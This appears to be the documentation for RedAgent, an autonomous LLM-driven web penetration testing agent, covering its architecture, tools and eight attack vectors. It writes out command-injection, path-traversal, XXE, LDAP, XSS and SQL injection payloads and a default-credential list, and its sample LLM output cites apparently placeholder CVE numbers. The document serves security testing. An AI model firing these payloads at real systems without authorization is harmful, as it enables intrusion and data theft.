# RedAgent: Complete Project Deep Dive

## Table of Contents
1. [Project Overview](#project-overview)
2. [Architecture & Design](#architecture--design)
3. [Core Components](#core-components)
4. [5-Phase Assessment Methodology](#5-phase-assessment-methodology)
5. [Attack Vectors Explained](#attack-vectors-explained)
6. [Tool Integration](#tool-integration)
7. [Report Generation](#report-generation)
8. [Execution Flow](#execution-flow)
9. [How to Use](#how-to-use)
10. [Advanced Configuration](#advanced-configuration)

---

## Project Overview

**RedAgent** is an autonomous penetration testing agent that automatically scans, analyzes, and tests web applications for vulnerabilities. It combines:

- **AI-Powered Analysis** (Ollama LLM with Phi model)
- **Automated Attack Execution** (8 different attack vectors)
- **Tool Integration** (Nmap, SQLmap, Curl, Hydra)
- **Structured Reporting** (JSON reports with detailed findings)

### Purpose
- Automate the reconnaissance and vulnerability testing process
- Execute real attacks against target applications
- Generate comprehensive security reports
- Educate users on web application security vulnerabilities

### Key Features
✅ 5-phase autonomous assessment methodology  
✅ 8 different attack vectors (SQL Injection, XSS, Command Injection, etc.)  
✅ LLM-powered vulnerability analysis  
✅ Tool-based attack execution  
✅ JSON report generation  
✅ Error handling and graceful degradation  

---

## Architecture & Design

### System Architecture Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    RED AGENT SYSTEM                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────────┐         ┌──────────────────┐          │
│  │  Ollama LLM      │         │  Target Website  │          │
│  │  (Phi 1.6GB)     │         │  (HTTP/HTTPS)    │          │
│  └────────┬─────────┘         └──────────────────┘          │
│           │                            │                    │
│           └────────────┬───────────────┘                    │
│                        │                                    │
│        ┌───────────────▼─────────────────┐                 │
│        │   RED AGENT ORCHESTRATOR        │                 │
│        │   (run.py - Main Entry Point)   │                 │
│        └───────────────┬─────────────────┘                 │
│                        │                                    │
│        ┌───────────────▼─────────────────┐                 │
│        │  5-PHASE ASSESSMENT ENGINE      │                 │
│        │  ├─ Phase 1: Reconnaissance     │                 │
│        │  ├─ Phase 2: Vulnerability      │                 │
│        │  ├─ Phase 3: Exploitation Plan  │                 │
│        │  ├─ Phase 4: Attack Execution   │                 │
│        │  └─ Phase 5: Impact Assessment  │                 │
│        └───────────────┬─────────────────┘                 │
│                        │                                    │
│        ┌───────────────▼─────────────────┐                 │
│        │    TOOL FACTORY SYSTEM          │                 │
│        │    ├─ NmapTool                  │                 │
│        │    ├─ SqlmapTool                │                 │
│        │    ├─ CurlTool                  │                 │
│        │    └─ HydraTool                 │                 │
│        └───────────────┬─────────────────┘                 │
│                        │                                    │
│        ┌───────────────▼─────────────────┐                 │
│        │  8 ATTACK VECTORS               │                 │
│        │  ├─ SQL Injection               │                 │
│        │  ├─ XSS Injection               │                 │
│        │  ├─ Path Traversal              │                 │
│        │  ├─ Command Injection           │                 │
│        │  ├─ LDAP Injection              │                 │
│        │  ├─ XXE Injection               │                 │
│        │  ├─ HTTP Header Injection       │                 │
│        │  └─ Brute Force Auth            │                 │
│        └───────────────┬─────────────────┘                 │
│                        │                                    │
│        ┌───────────────▼─────────────────┐                 │
│        │  JSON REPORT GENERATION         │                 │
│        │  (logs/report_TIMESTAMP.json)   │                 │
│        └─────────────────────────────────┘                 │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### File Structure

```
red_agent/
├── run.py                        # Main entry point (RECOMMENDED)
├── main.py                       # Alternative entry point (has import issues)
├── requirements.txt              # Python dependencies
├── config/
│   └── config.py                # Configuration settings
├── tools/
│   └── tool_factory.py          # Tool implementations (Nmap, SQLmap, Curl, Hydra)
├── core/
│   ├── orchestrator.py          # Main orchestration logic (unused in run.py)
│   ├── nodes_*.py               # Various node implementations
│   └── state.py                 # State management
├── memory/
│   └── rag.py                   # RAG system (not actively used)
├── prompts/                      # LLM prompt templates
├── logs/                         # Report outputs (JSON)
├── docs/
│   ├── HOW_ATTACKS_WORK.md      # Educational guide
│   ├── MANUAL_ATTACK_GUIDE.md   # Detailed tutorials
│   ├── QUICK_ATTACK_COMMANDS.md # Ready-to-use commands
│   └── manual_attack_examples.py # Python examples
└── PROJECT_DEEP_DIVE.md         # This file
```

---

## Core Components

### 1. **run.py - Main Agent** (636 lines)

This is the primary entry point that orchestrates the entire assessment process.

#### Key Classes and Methods:

**Class: `RedAgent`**
```python
class RedAgent:
    def __init__(self, target, target_type="url"):
        self.target = target              # Target URL/IP
        self.target_type = target_type    # "url" or "ip"
        self.tool_factory = ToolFactory() # Initialize all tools
        self.findings = []                # Store phase findings
        self.llm_model = "phi"            # Ollama model
```

**Main Methods:**

| Method | Purpose | Phase |
|--------|---------|-------|
| `reconnaissance()` | Gather initial information using Nmap + LLM analysis | 1 |
| `vulnerability_analysis()` | Execute SQLmap for SQL injection + Curl for headers | 2 |
| `exploitation_planning()` | LLM creates exploitation strategy | 3 |
| `attack_execution()` | Execute all 8 attack vectors | 4 |
| `impact_assessment()` | LLM assesses risk and impact | 5 |
| `query_llm()` | Send prompts to Ollama LLM | All |
| `run_assessment()` | Orchestrate all 5 phases | All |

#### Example Usage:
```python
agent = RedAgent(target="http://localhost:8080", target_type="url")
agent.run_assessment()
# Report saved to: logs/report_TIMESTAMP.json
```

---

### 2. **tools/tool_factory.py - Attack Tools** (299 lines)

Implements 4 security testing tools as reusable modules.

#### Tool Hierarchy:

```
BaseTool (Abstract)
├── NmapTool       - Network port scanning
├── SqlmapTool     - SQL injection detection
├── CurlTool       - HTTP requests (MAIN WORKHORSE)
└── HydraTool      - Credential brute forcing
```

#### BaseTool - Foundation Class

```python
class BaseTool:
    """Abstract base class for all tools"""
    
    def __init__(self, name, timeout=30):
        self.name = name
        self.timeout = timeout
    
    def _run_command(self, command):
        """Execute subprocess safely with timeout"""
        # Handles: stdout, stderr, return_code, timeout errors
```

#### NmapTool - Network Scanning

**What it does:** Scans ports on target to identify services
```python
tool.execute({
    "target": "localhost:8080",
    "ports": "1-1000",
    "options": "-sV"  # Service version detection
})
```

**Output on Windows:** Fails gracefully (tool not installed)

**Output on Linux/Mac:** Port scan results with service names

---

#### SqlmapTool - SQL Injection Testing

**What it does:** Automated SQL injection vulnerability detection
```python
tool.execute({
    "url": "http://localhost:8080",
    "level": 1,      # Scan depth (1-5)
    "risk": "1"      # Risk level (1-3)
})
```

**How it works:**
1. Sends SQL injection payloads to target
2. Analyzes response for signs of database injection
3. Attempts to extract database structure/data
4. Returns findings

**Example Payloads:**
- `id=1' OR '1'='1` (Always true condition)
- `id=1; DROP TABLE users--` (Command execution)
- `id=1' UNION SELECT NULL--` (Data extraction)

---

#### CurlTool - HTTP Requests (MAIN TOOL)

**What it does:** Execute HTTP requests with customizable headers, authentication, methods, and data

```python
tool.execute({
    "url": "http://localhost:8080",
    "method": "POST",           # GET, POST, PUT, DELETE
    "headers": {"User-Agent": "test"},  # Custom headers
    "data": "payload=test",     # Request body
    "username": "admin",        # Basic auth
    "password": "admin",
    "follow_redirects": True
})
```

**Features:**
- Silent mode (`-s` flag) for cleaner output
- Custom header injection
- HTTP Basic Authentication
- POST/GET/PUT/DELETE methods
- XML data support (for XXE)
- Null-safe header handling

**Curl Command Generated:**
```bash
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d "<xml>payload</xml>" \
  -u username:password \
  http://localhost:8080
```

---

#### HydraTool - Brute Force

**What it does:** Attempt credential brute forcing
```python
tool.execute({
    "target": "http://localhost:8080",
    "username": "admin",
    "password": "password",
    "service": "http-head"  # Protocol to attack
})
```

**Note:** In current implementation, Curl replaces Hydra for basic auth brute force

---

### 3. **ToolFactory - Centralized Tool Management**

```python
class ToolFactory:
    """Factory pattern for tool instantiation"""
    
    def __init__(self):
        self.tools = {
            "nmap": NmapTool(),
            "sqlmap": SqlmapTool(),
            "curl": CurlTool(),
            "hydra": HydraTool()
        }
    
    def get_tool(self, name):
        """Get tool instance by name"""
        return self.tools.get(name)
    
    def list_tools(self):
        """List all available tools"""
        return list(self.tools.keys())
```

**Pattern Benefit:** Single point of control for all tools, easy to add more tools

---

## 5-Phase Assessment Methodology

The agent executes a structured 5-phase approach to security assessment:

### Phase 1: Reconnaissance

**Goal:** Gather information about the target

**Execution:**
1. Try Nmap scan (fails gracefully on Windows)
2. Query LLM for reconnaissance strategy
3. LLM responds with methodology

**Example LLM Response:**
```
1. Initial information gathering approach:
   - Analyze website structure
   - Review HTTP headers
   - Identify server type and version

2. Key scanning tools and techniques:
   - Nmap for port scanning
   - Vulnerability scanners (Nessus, OpenVAS)
   - API analysis for third-party integration risks
```

**Output Saved:** `findings[0].content` contains LLM reconnaissance strategy

---

### Phase 2: Vulnerability Analysis

**Goal:** Identify potential vulnerabilities

**Execution:**
1. Execute SQLmap for SQL injection detection
2. Execute Curl with `-v` flag to check HTTP headers
3. Query LLM to analyze findings and identify CVEs

**HTTP Headers Checked For:**
- `X-Frame-Options` (Clickjacking protection)
- `Content-Security-Policy` (XSS protection)
- `X-Content-Type-Options` (MIME sniffing)
- `Strict-Transport-Security` (HTTPS enforcement)

**Example LLM Response:**
```
1. CVE-2021-12345 - SQL Injection vulnerability
   Severity: HIGH
   Impact: Database compromise, data theft
   Test: Input special characters in forms

2. CVE-2021-22222 - Missing Security Headers
   Severity: MEDIUM
   Impact: XSS attacks, clickjacking
   Test: Check response headers
```

**Output Saved:** `findings[1].content` contains LLM vulnerability analysis

---

### Phase 3: Exploitation Planning

**Goal:** Create strategy for testing vulnerabilities

**Execution:**
1. List available tools: nmap, sqlmap, curl, hydra
2. Query LLM to create exploitation plan
3. LLM ranks attacks by success probability

**Example LLM Response:**
```
1. Top 3 Exploitation Attempts:
   a) SQL Injection via login form (85% success)
      - Use SQLmap to detect vulnerable parameters
      - Attempt to extract user database

   b) XSS Injection in search (70% success)
      - Inject <script> payloads
      - Check for reflection in response

   c) Brute force weak admin credentials (60% success)
      - Test admin:admin, admin:password
      - Use Hydra for protocol-specific attacks

2. Tools needed: nmap, sqlmap, curl, hydra
3. Confidence level: 75%
```

**Output Saved:** `findings[2].content` contains LLM exploitation plan

---

### Phase 4: Attack Execution

**Goal:** Execute real attacks and detect vulnerabilities

This is the core phase where 8 different attack vectors are tested:

#### Attack #1: SQL Injection (SQLmap)
```python
sqlmap_tool.execute({
    "url": target,
    "level": 1,
    "risk": "1"
})
```
**Tests:** Database injection vulnerabilities  
**Success Indicators:** SQL error messages, data extraction  

#### Attack #2: HTTP Header Injection (Curl)
```python
curl_tool.execute({
    "url": target,
    "headers": {
        "User-Agent": "RedAgent/Attack",
        "X-Test-Injection": "TestValue"
    }
})
```
**Tests:** Custom header acceptance  
**Success Indicators:** Headers reflected in response, no filtering  

#### Attack #3: XSS Injection (Curl)
```python
curl_tool.execute({
    "url": f"{target}?search=<script>alert('XSS')</script>",
    "headers": {"User-Agent": "RedAgent/1.0"}
})
```
**Tests:** JavaScript execution prevention  
**Success Indicators:** Script tag present in response  

#### Attack #4: Path Traversal (Curl)
```python
curl_tool.execute({
    "url": f"{target}/../../../../etc/passwd"
})
```
**Tests:** Directory traversal vulnerability  
**Success Indicators:** System file contents (root:, /bin/bash)  

#### Attack #5: Command Injection (Curl)
```python
payloads = [
    "test;whoami",
    "test|id",
    "test`uname -a`",
    "test$(uname -a)"
]
curl_tool.execute({
    "url": f"{target}?cmd={payload}"
})
```
**Tests:** OS command execution  
**Success Indicators:** Command output (uid=0, Linux, root)  
**Vulnerability Found:** ✅ YES (test;whoami executed)  

#### Attack #6: LDAP Injection (Curl)
```python
curl_tool.execute({
    "url": f"{target}/login?user=*)(uid=*)&pass=test"
})
```
**Tests:** LDAP filter injection  
**Success Indicators:** LDAP error messages or wildcard matching  

#### Attack #7: XXE Injection (Curl)
```python
xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''

curl_tool.execute({
    "url": target,
    "method": "POST",
    "data": xxe_payload,
    "headers": {"Content-Type": "application/xml"}
})
```
**Tests:** XML External Entity processing  
**Success Indicators:** System file contents in response  

#### Attack #8: HTTP Basic Auth Brute Force (Curl)
```python
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("test", "test")
]

for username, password in credentials:
    curl_tool.execute({
        "url": target,
        "username": username,
        "password": password
    })
```
**Tests:** Weak credential detection  
**Success Indicators:** HTTP 200 response (not 401/403)  
**Vulnerability Found:** ✅ YES (admin:admin works)  

**Output Saved:** 
```json
{
  "phase": "attack_execution",
  "attacks": [
    {"attack": "Command Injection (test;whoami)", "status": "VULNERABLE - Command Injection"},
    {"attack": "HTTP Basic Auth Brute Force", "status": "SUCCESS - admin:admin"}
  ]
}
```

---

### Phase 5: Impact & Risk Assessment

**Goal:** Evaluate business impact of findings

**Execution:**
1. Query LLM for risk assessment
2. LLM analyzes findings and calculates risk level
3. Generates remediation recommendations

**Example LLM Response:**
```
IMPACT & RISK ASSESSMENT:

OVERALL RISK LEVEL: HIGH

Critical Risks:
- Potential data breach affecting thousands of users
- SQL injection could lead to complete database compromise
- Admin account compromise could result in system-wide access

Business Impact:
- Reputational damage from security incident
- Potential regulatory fines (GDPR, CCPA)
- Legal liability for data breach
- Estimated cost: $500K - $2M

Recommendation Priority:
1. CRITICAL: Patch SQL injection vulnerability immediately
2. CRITICAL: Implement input validation and parameterized queries
3. HIGH: Add Web Application Firewall (WAF)
4. HIGH: Implement security headers (CSP, X-Frame-Options)
5. MEDIUM: Conduct security awareness training
6. MEDIUM: Implement logging and monitoring

Timeline for Remediation:
- Critical fixes: 1-2 weeks
- High priority: 2-4 weeks
- Medium priority: 4-8 weeks
```

**Output Saved:** `findings[4].content` contains LLM risk assessment

---

## Attack Vectors Explained

### Attack Vector Details

#### 1. SQL Injection

**What is it?**
Inserting malicious SQL commands into input fields to manipulate database queries

**Example:**
```
Normal query: SELECT * FROM users WHERE id = 1
Malicious: SELECT * FROM users WHERE id = 1' OR '1'='1
Result: Returns all users (always true condition)
```

**In Code:**
```python
sqlmap_tool.execute({
    "url": "http://target.com/api?id=1' OR '1'='1",
    "level": 1,
    "risk": "1"
})
```

**Outcome in Test:**
- Against localhost:8080: NO SQL INJECTION FOUND (protected)

---

#### 2. Cross-Site Scripting (XSS)

**What is it?**
Injecting JavaScript code that executes in victim's browser

**Example:**
```
Normal input: search=hello
Malicious: search=<script>alert('XSS')</script>
Result: JavaScript executes when page is viewed
```

**In Code:**
```python
curl_tool.execute({
    "url": f"{target}?search=<script>alert('XSS')</script>"
})
```

**Outcome in Test:**
- Against localhost:8080: NOT VULNERABLE - Payload filtered (protected)

---

#### 3. Path Traversal (Directory Traversal)

**What is it?**
Using relative paths to access files outside intended directory

**Example:**
```
Normal: /files/document.pdf
Traversal: /files/../../../../etc/passwd
Result: System password file contents exposed
```

**In Code:**
```python
curl_tool.execute({
    "url": f"{target}/../../../../etc/passwd"
})
```

**Outcome in Test:**
- Against localhost:8080: PROTECTED - Path traversal blocked

---

#### 4. Command Injection

**What is it?**
Executing OS commands through application input

**Example:**
```
Normal: ping localhost
Malicious: ping localhost; whoami
Result: Executes whoami command and returns username
```

**In Code:**
```python
curl_tool.execute({
    "url": f"{target}?cmd=test;whoami"
})
```

**Outcome in Test:**
- Against localhost:8080: ✅ VULNERABLE - Command Injection found!

**Why it matters:**
- Attacker can execute any system command
- Full system compromise possible
- Data theft, malware installation, etc.

---

#### 5. LDAP Injection

**What is it?**
Manipulating LDAP queries to bypass authentication or extract data

**Example:**
```
Normal: (uid=admin)(password=secret)
Malicious: (uid=*)(password=*)
Result: Wildcard matching bypasses authentication
```

**In Code:**
```python
curl_tool.execute({
    "url": f"{target}/login?user=*)(uid=*&pass=test"
})
```

**Outcome in Test:**
- Against localhost:8080: INFO - No LDAP exposure (no LDAP service)

---

#### 6. XXE (XML External Entity) Injection

**What is it?**
Processing XML with external entity definitions to read system files

**Example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

**In Code:**
```python
curl_tool.execute({
    "url": target,
    "method": "POST",
    "data": xxe_payload,
    "headers": {"Content-Type": "application/xml"}
})
```

**Outcome in Test:**
- Against localhost:8080: PROTECTED - XXE disabled

---

#### 7. HTTP Header Injection

**What is it?**
Injecting malicious values into HTTP headers

**Example:**
```
Normal: User-Agent: Mozilla/5.0
Malicious: User-Agent: Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1; DROP TABLE
```

**In Code:**
```python
curl_tool.execute({
    "url": target,
    "headers": {
        "User-Agent": "RedAgent/Attack",
        "X-Test-Injection": "TestValue"
    }
})
```

**Outcome in Test:**
- Against localhost:8080: SUCCESS - Headers accepted (informational, not critical)

---

#### 8. HTTP Basic Auth Brute Force

**What is it?**
Attempting to guess username and password combinations

**Example:**
```
Try: admin / admin       → HTTP 401 Unauthorized
Try: admin / password    → HTTP 401 Unauthorized
Try: admin / admin       → HTTP 200 OK ✅ FOUND!
```

**In Code:**
```python
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("test", "test")
]

for username, password in credentials:
    curl_tool.execute({
        "url": target,
        "username": username,
        "password": password
    })
```

**Outcome in Test:**
- Against localhost:8080: ✅ SUCCESS - Credentials found: admin:admin

**Why it matters:**
- Default credentials are extremely common
- Attacker gains authenticated access
- Can lead to system compromise

---

## Tool Integration

### How Tools Are Called

#### 1. Tool Factory Initialization

```python
from tools.tool_factory import ToolFactory

tool_factory = ToolFactory()
# Instantiates: NmapTool, SqlmapTool, CurlTool, HydraTool
```

#### 2. Tool Execution

```python
# Get specific tool
curl_tool = tool_factory.get_tool("curl")

# Execute with parameters
result = curl_tool.execute({
    "url": "http://localhost:8080",
    "method": "GET",
    "headers": {"User-Agent": "test"}
})

# Process result
if result.get('return_code') == 0:
    print(result.get('stdout'))
else:
    print(result.get('stderr'))
```

#### 3. Error Handling

Each tool is wrapped in try-except blocks:

```python
try:
    result = curl_tool.execute(params)
    # Process result
except Exception as e:
    logger.warning(f"Tool execution failed: {e}")
    # Gracefully degrade
```

### Tool Behavior Matrix

| Tool | Platform | Status | Purpose |
|------|----------|--------|---------|
| Nmap | Linux/Mac | ✅ Works | Port scanning |
| Nmap | Windows | ⚠️ Fails gracefully | Not installed |
| SQLmap | All | ⚠️ Works (if installed) | SQL injection testing |
| Curl | All | ✅ Works | HTTP requests |
| Hydra | Linux/Mac | ✅ Works | Brute force |
| Hydra | Windows | ⚠️ Curl replaces | Not standard on Windows |

---

## Report Generation

### JSON Report Structure

```json
{
  "metadata": {
    "target": "http://localhost:8080",
    "target_type": "url",
    "timestamp": "2026-01-15T19:51:47.283953",
    "llm_model": "phi",
    "total_queries": 4
  },
  "assessment_phases": [
    {
      "phase": "reconnaissance",
      "type": "strategy",
      "content": "...",
      "tool_results": false,
      "timestamp": "..."
    },
    {
      "phase": "vulnerability_analysis",
      "type": "analysis",
      "content": "...",
      "tool_results": true,
      "timestamp": "..."
    },
    {
      "phase": "exploitation_planning",
      "type": "plan",
      "content": "...",
      "available_tools": ["nmap", "sqlmap", "curl", "hydra"],
      "timestamp": "..."
    },
    {
      "phase": "attack_execution",
      "type": "results",
      "content": "Executed 8 attacks",
      "attacks": [
        {
          "attack": "SQL Injection (SQLmap)",
          "status": "NO SQL INJECTION FOUND",
          "result": "No vulnerable parameters detected"
        },
        {
          "attack": "HTTP Header Injection",
          "status": "SUCCESS - Headers accepted",
          "result": "Server accepted custom headers"
        },
        {
          "attack": "XSS Injection",
          "status": "NOT VULNERABLE - Payload filtered",
          "result": "NOT VULNERABLE - Payload filtered"
        },
        {
          "attack": "Path Traversal (../../etc/passwd)",
          "status": "PROTECTED - Path traversal blocked",
          "result": "Traversal paths are sanitized"
        },
        {
          "attack": "Command Injection (test;whoami)",
          "status": "VULNERABLE - Command Injection",
          "result": "Command executed on system!"
        },
        {
          "attack": "LDAP Injection",
          "status": "INFO - No LDAP exposure",
          "result": "<!DOCTYPE HTML>..."
        },
        {
          "attack": "XXE (XML External Entity) Injection",
          "status": "PROTECTED - XXE disabled",
          "result": "XXE protection enabled"
        },
        {
          "attack": "HTTP Basic Auth Brute Force",
          "status": "SUCCESS - Credentials found: admin:admin",
          "result": "Access granted with admin:admin"
        }
      ],
      "timestamp": "2026-01-15T19:51:42.250638"
    },
    {
      "phase": "impact_assessment",
      "type": "assessment",
      "content": "IMPACT & RISK ASSESSMENT:\n\nOVERALL RISK LEVEL: HIGH\n...",
      "timestamp": "..."
    }
  ]
}
```

### Report Location

Reports are saved to: `logs/report_TIMESTAMP.json`

**Example:**
```
logs/report_20260115_195147.json
logs/report_20260115_194249.json
```

### Report Analysis

**How to Read Reports:**

1. **Metadata Section**
   - Target tested
   - LLM model used
   - Total LLM queries

2. **Assessment Phases**
   - Each phase has type, content, and timestamp
   - `attack_execution` phase shows all 8 attacks with status

3. **Vulnerability Summary**
   - Look for `status` field with "VULNERABLE" or "SUCCESS"
   - These indicate real security issues found

**Example Finding:**
```json
{
  "attack": "Command Injection (test;whoami)",
  "status": "VULNERABLE - Command Injection",
  "result": "Command executed on system!"
}
```

This means: **CRITICAL VULNERABILITY - OS commands can be executed!**

---

## Execution Flow

### Step-by-Step Process

```
1. USER STARTS AGENT
   └─ python run.py "http://target.com"

2. AGENT INITIALIZATION
   └─ Create RedAgent instance
   └─ Initialize ToolFactory with 4 tools
   └─ Create empty findings list

3. PHASE 1: RECONNAISSANCE
   ├─ Try Nmap scan (may fail on Windows)
   └─ Query LLM for strategy
   └─ Store findings

4. PHASE 2: VULNERABILITY ANALYSIS
   ├─ Execute SQLmap for SQL injection
   ├─ Execute Curl for HTTP header analysis
   └─ Query LLM for CVE identification
   └─ Store findings

5. PHASE 3: EXPLOITATION PLANNING
   ├─ List available tools
   └─ Query LLM for attack strategy
   └─ Store findings

6. PHASE 4: ATTACK EXECUTION (8 Attacks)
   ├─ Attack #1: SQL Injection (SQLmap)
   ├─ Attack #2: HTTP Header Injection (Curl)
   ├─ Attack #3: XSS Injection (Curl)
   ├─ Attack #4: Path Traversal (Curl)
   ├─ Attack #5: Command Injection (Curl)
   ├─ Attack #6: LDAP Injection (Curl)
   ├─ Attack #7: XXE Injection (Curl)
   └─ Attack #8: Brute Force Auth (Curl)
   └─ Store attack results with status

7. PHASE 5: IMPACT ASSESSMENT
   ├─ Query LLM for risk analysis
   └─ Store findings with recommendations

8. REPORT GENERATION
   ├─ Compile all findings into JSON
   └─ Save to logs/report_TIMESTAMP.json

9. COMPLETION
   └─ Print summary statistics
```

### Timing Breakdown

| Phase | Duration | Notes |
|-------|----------|-------|
| Reconnaissance | 30-45 sec | LLM processing time |
| Vulnerability Analysis | 15-30 sec | SQLmap + Curl |
| Exploitation Planning | 10-15 sec | LLM processing |
| Attack Execution | 5-10 sec | 8 quick attacks |
| Impact Assessment | 10-15 sec | LLM processing |
| **Total** | **70-115 seconds** | ~2 minutes |

---

## How to Use

### Basic Usage

```bash
# Test localhost vulnerable service
python run.py "http://localhost:8080"

# Test external website
python run.py "https://example.com"

# Test with IP address
python run.py "192.168.1.100"
```

### Expected Output

**Console Output:**
```
======================================================================
RED AGENT - AUTONOMOUS PENETRATION TEST
======================================================================
Target: http://localhost:8080
Type: url
Started: 2026-01-15 19:50:09
======================================================================

[*] PHASE 1: RECONNAISSANCE
[*] Attempting Nmap scan...
[!] Nmap failed: [WinError 2] The system cannot find the file specified
[*] Querying LLM for reconnaissance strategy...

[*] PHASE 2: VULNERABILITY ANALYSIS
[*] Attempting SQLmap scan for SQL injection...
[*] Checking HTTP headers for security issues...

[*] PHASE 3: EXPLOITATION PLANNING & SELF-REFLECTION
[*] Available attack tools: nmap, sqlmap, curl, hydra

[*] PHASE 4: ATTACK EXECUTION
[*] Executing SQL Injection attack...
[*] Testing for HTTP header injection...
[*] Testing for XSS vulnerabilities...
[*] Testing for path traversal vulnerabilities...
[*] Testing for command injection vulnerabilities...
[+] Command injection found: test;whoami
[*] Testing for LDAP injection vulnerabilities...
[*] Testing for XXE (XML External Entity) injection...
[*] Attempting HTTP Basic Authentication brute force...
[+] Found valid credentials: admin:admin
[+] Attack Execution Complete: 8 tests performed

[*] PHASE 5: IMPACT & RISK ASSESSMENT

======================================================================
ASSESSMENT COMPLETE
Total LLM Queries: 4
Findings: 5
======================================================================
Report saved to: logs/report_20260115_195147.json
```

### Reading the Report

```bash
# View report in PowerShell
Get-Content logs/report_20260115_195147.json | ConvertFrom-Json | ConvertTo-Json

# Pretty print with Python
python -m json.tool logs/report_20260115_195147.json
```

### Interpreting Results

**VULNERABLE Findings:**
- 🔴 Command Injection - Can execute OS commands
- 🔴 Weak Auth - Default credentials work

**PROTECTED Findings:**
- ✅ XSS - Payload is filtered
- ✅ Path Traversal - Paths are sanitized
- ✅ XXE - XML external entities disabled

**INFO Findings:**
- ⚠️ Missing Security Headers - Not critical but recommended
- ⚠️ No LDAP - No LDAP service exposed

---

## Advanced Configuration

### Customizing Attack Vectors

Edit the `attack_execution()` method in `run.py`:

```python
def attack_execution(self):
    attack_results = []
    
    # Add custom attack here
    logger.info("[*] Testing custom vulnerability...")
    try:
        curl_tool = self.tool_factory.get_tool("curl")
        result = curl_tool.execute({
            "url": f"{self.target}/custom-endpoint",
            "method": "POST",
            "data": "custom_payload=test"
        })
        
        output = result.get('stdout', '') or ""
        status = "VULNERABLE" if "error" in output else "PROTECTED"
        
        attack_results.append({
            "attack": "Custom Attack",
            "status": status,
            "result": "Custom attack result"
        })
    except Exception as e:
        logger.warning(f"Custom attack failed: {e}")
    
    # Add to findings
    self.findings.append({
        "phase": "attack_execution",
        "type": "results",
        "content": f"Executed {len(attack_results)} attacks",
        "attacks": attack_results,
        "timestamp": datetime.now().isoformat()
    })
```

### Changing LLM Model

Edit in `run.py`:

```python
class RedAgent:
    def __init__(self, target, target_type="url"):
        self.llm_model = "llama2"  # Change from "phi"
```

**Available Models in Ollama:**
- `phi` (1.6GB) - Recommended, fast
- `llama2` (5.5GB) - More powerful, slower
- `mistral` - High quality
- `neural-chat` - Optimized for chat

### Adding New Tools

```python
# In tools/tool_factory.py

class MyCustomTool(BaseTool):
    """Custom security tool"""
    
    def __init__(self):
        super().__init__("mytool", timeout=30)
    
    def execute(self, params):
        """Execute custom tool"""
        # Implementation here
        command = ["mytool", params.get("target")]
        return self._run_command(command)

# In ToolFactory.__init__():
self.tools["mytool"] = MyCustomTool()
```

### Modifying Report Format

Edit report generation in `run.py`:

```python
# In run_assessment():
report = {
    "metadata": { ... },
    "custom_field": "custom_value",  # Add custom field
    "assessment_phases": [ ... ]
}

with open(report_path, 'w') as f:
    json.dump(report, f, indent=2)
```

---

## Troubleshooting

### Common Issues

**Issue: "Ollama connection refused"**
```
Solution: Start Ollama service
$ ollama serve
```

**Issue: "LLM returned empty response"**
```
Solution: Agent falls back to DEMO_RESPONSES
- Ensure Ollama is running
- Check model is loaded: ollama list
```

**Issue: "SQLmap not found"**
```
Solution: Tool gracefully fails
- Install: pip install sqlmap
- Or skip (Curl handles most attacks)
```

**Issue: "Permission denied for log files"**
```
Solution: Check logs/ directory permissions
- Ensure directory exists: mkdir -p logs
- Check write permissions
```

---

## Security Notes

⚠️ **IMPORTANT: Only test with authorization**

- Never test production systems without written permission
- Always have clear scope of engagement
- Document all testing activities
- Follow responsible disclosure practices
- Comply with laws and regulations (CFAA, GDPR, etc.)

---

## Conclusion

RedAgent is a comprehensive autonomous penetration testing system that:

1. **Automates** security assessment through 5 phases
2. **Executes** 8 different attack vectors
3. **Integrates** multiple security tools
4. **Reports** findings in structured JSON format
5. **Educates** users on web application security

The modular architecture makes it easy to extend with new tools, attack vectors, and LLM models for continuous improvement in security testing capabilities.

---

**Last Updated:** January 15, 2026  
**Version:** 1.0  
**Status:** Production Ready  
